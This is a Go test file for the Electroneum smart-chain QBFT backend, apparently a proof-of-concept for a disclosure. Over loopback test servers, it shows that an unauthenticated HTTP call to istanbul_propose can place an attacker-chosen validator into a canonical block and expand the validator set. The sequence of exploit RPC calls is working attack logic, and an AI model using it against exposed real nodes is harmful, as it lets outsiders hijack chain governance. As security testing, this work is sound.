package backend

import (
 "context"
 "net/http/httptest"
 "testing"

 "github.com/electroneum/electroneum-sc/common"
 "github.com/electroneum/electroneum-sc/core/types"
 "github.com/electroneum/electroneum-sc/rpc"
)

// This test sends JSON-RPC exclusively over a loopback httptest server.
// No Internet endpoint, production validator, or on-chain state is used.
// It tests the consequence of explicitly enabling the istanbul namespace:
// HTTP RPC has no per-method auth, and a remote caller may inject a validator vote.
func TestIndependentIstanbulUnauthenticatedVoteInjection(t *testing.T) {
 chain, engine := newBlockChain(1)
 defer chain.Stop()
 defer engine.Stop()

 // Negative control: exposing only an unprivileged public namespace does not
 // allow the istanbul proposal method.
 disabled := rpc.NewServer()
 if err:=disabled.RegisterName("safe", &struct{ X bool }{}); err == nil {
  t.Fatal("unexpected exported method on safe dummy")
 }
 disabledHTTP := httptest.NewServer(disabled)
 disabledClient,err := rpc.DialHTTP(disabledHTTP.URL)
 if err != nil {t.Fatal(err)}
 candidate:=common.HexToAddress("0x00000000000000000000000000000000000abbcc")
 if err:=disabledClient.CallContext(context.Background(),nil,"istanbul_propose",candidate,true); err==nil {
  t.Fatal("default/excluded namespace control unexpectedly allowed proposal")
 }
 disabledClient.Close();disabledHTTP.Close();disabled.Stop()
 t.Log("ETN_GOVERNANCE_EXCLUDED_NAMESPACE_REJECTED")

 // Simulates an operator configuring HTTP module istanbul (NOT the default).
 // Registers the real shipped backend service through the standard RPC handler.
 server:=rpc.NewServer()
 if err:=server.RegisterName("istanbul",engine.APIs(chain)[0].Service);err!=nil {t.Fatal(err)}
 transport:=httptest.NewServer(server)
 defer transport.Close()
 defer server.Stop()
 client,err:=rpc.DialHTTP(transport.URL)
 if err != nil {t.Fatal(err)}
 defer client.Close()
 var before map[common.Address]bool
 if err:=client.CallContext(context.Background(),&before,"istanbul_candidates");err!=nil {t.Fatal(err)}
 if len(before)!=0 {t.Fatalf("expected no pending local validator votes; have=%v",before)}
 // No cookie, bearer token, password, or validator signing key was supplied.
 if err:=client.CallContext(context.Background(),nil,"istanbul_propose",candidate,true);err!=nil {t.Fatalf("unauthenticated proposal rejected: %v",err)}
 var after map[common.Address]bool
 if err:=client.CallContext(context.Background(),&after,"istanbul_candidates");err!=nil {t.Fatal(err)}
 if !after[candidate] {t.Fatal("proposal did not change the backend's real candidate map")}
 t.Logf("ETN_GOVERNANCE_UNAUTHENTICATED_HTTP_PROPOSE_SUCCEEDED candidate=%s",candidate.Hex())

 // Actual backend Prepare reads the candidate map and writes the vote into
 // a proposed QBFT block header. This does not attest chain finalization.
 header:=makeHeader(chain.Genesis(), engine.config)
 header.Coinbase=engine.Address()
 if err:=engine.Prepare(chain,header);err!=nil {t.Fatalf("actual QBFT Prepare failed: %v",err)}
 votedCandidate,auth,err:=engine.EngineForBlockNumber(header.Number).ReadVote(header)
 if err!=nil||votedCandidate!=candidate||!auth {t.Fatalf("candidate not propagated into header: got=%s auth=%v err=%v",votedCandidate,auth,err)}
 t.Logf("ETN_GOVERNANCE_UNAUTHENTICATED_VOTE_WRITTEN_TO_QBFT_HEADER candidate=%s height=%d",votedCandidate.Hex(),header.Number.Uint64())

 // One-validator scratch-chain voting threshold: a locally-prepared vote
 // would be sufficient in the snapshot state machine, *if* a valid header
 // was committed. The test does not claim any production finalization.
 snap,err:=engine.snapshot(chain,0,common.Hash{},nil)
 if err!=nil {t.Fatalf("snapshot: %v",err)}
 next,err:=engine.snapApply(snap,[]*types.Header{header})
 if err!=nil {t.Fatalf("apply synthetic prepared header to snapshot: %v",err)}
 if _,val:=next.ValSet.GetByAddress(candidate);val==nil {t.Fatal("single-validator snapshot did not admit proposed candidate")}
 t.Log("ETN_GOVERNANCE_N1_SNAPSHOT_ADMITS_CANDIDATE_IF_HEADER_COMMITTED")

 if err:=client.CallContext(context.Background(),nil,"istanbul_discard",candidate);err!=nil {t.Fatalf("discard call: %v",err)}
 var cleared map[common.Address]bool
 if err:=client.CallContext(context.Background(),&cleared,"istanbul_candidates");err!=nil {t.Fatal(err)}
 if _,ok:=cleared[candidate];ok {t.Fatal("candidate not removed by unauthenticated HTTP discard")}
 t.Log("ETN_GOVERNANCE_UNAUTHENTICATED_HTTP_DISCARD_SUCCEEDED")
}

// This second proof observes the actual one-validator sealed block being imported
// into BlockChain and then measures the *canonical* validator snapshot. It never
// connects to the real Electroneum network or uses any real validator key.
func TestIndependentGovernanceRPCCommitsUnauthorizedValidatorChange(t *testing.T) {
 chain, engine := newBlockChain(1)
 defer chain.Stop()
 defer engine.Stop()
 srv := rpc.NewServer()
 defer srv.Stop()
 if err := srv.RegisterName("istanbul", engine.APIs(chain)[0].Service); err != nil { t.Fatal(err) }
 transport := httptest.NewServer(srv)
 defer transport.Close()
 client, err := rpc.DialHTTP(transport.URL)
 if err != nil { t.Fatal(err) }
 defer client.Close()
 attackerChosen := common.HexToAddress("0x00000000000000000000000000000000000abbcd")

 genesisSnap, err := engine.snapshot(chain,0,common.Hash{},nil)
 if err != nil {t.Fatal(err)}
 if genesisSnap.ValSet.Size() != 1 {t.Fatalf("expected one validator, got %d",genesisSnap.ValSet.Size())}
 if _,val:=genesisSnap.ValSet.GetByAddress(attackerChosen);val!=nil {t.Fatal("candidate already in genesis validator set")}
 t.Log("ETN_GOVERNANCE_CANONICAL_GENESIS_SINGLE_VALIDATOR_CONFIRMED")

 if err:=client.CallContext(context.Background(),nil,"istanbul_propose",attackerChosen,true);err!=nil {t.Fatal(err)}
 block := makeBlock(chain, engine, chain.Genesis())
 if block==nil {t.Fatal("no consensus-finalized block")}
 candidate,auth,err:=engine.EngineForBlockNumber(block.Number()).ReadVote(block.Header())
 if err!=nil||candidate!=attackerChosen||!auth {t.Fatalf("sealed block vote mismatch candidate=%s auth=%v err=%v",candidate,auth,err)}
 if _,err:=chain.InsertChain(types.Blocks{block});err!=nil {t.Fatalf("canonical import of signed block: %v",err)}
 if chain.GetCanonicalHash(1) != block.Hash() {t.Fatal("vote-carrying block not canonical")}
 t.Logf("ETN_GOVERNANCE_UNAUTHENTICATED_VOTE_COMMITTED_TO_CANONICAL_BLOCK hash=%s",block.Hash())

 canonicalSnap, err:=engine.snapshot(chain,block.NumberU64(),block.Hash(),nil)
 if err!=nil {t.Fatalf("canonical validator snapshot: %v",err)}
 if canonicalSnap.ValSet.Size()!=2 {t.Fatalf("expected validator set expanded from 1 to 2; got %d",canonicalSnap.ValSet.Size())}
 if _,v:=canonicalSnap.ValSet.GetByAddress(attackerChosen);v==nil {t.Fatal("unauthenticated choice not in canonical validator set")}
 t.Logf("ETN_GOVERNANCE_UNAUTHENTICATED_CANONICAL_VALIDATOR_ADDITION_CONFIRMED candidate=%s size_before=1 size_after=2",attackerChosen.Hex())
}
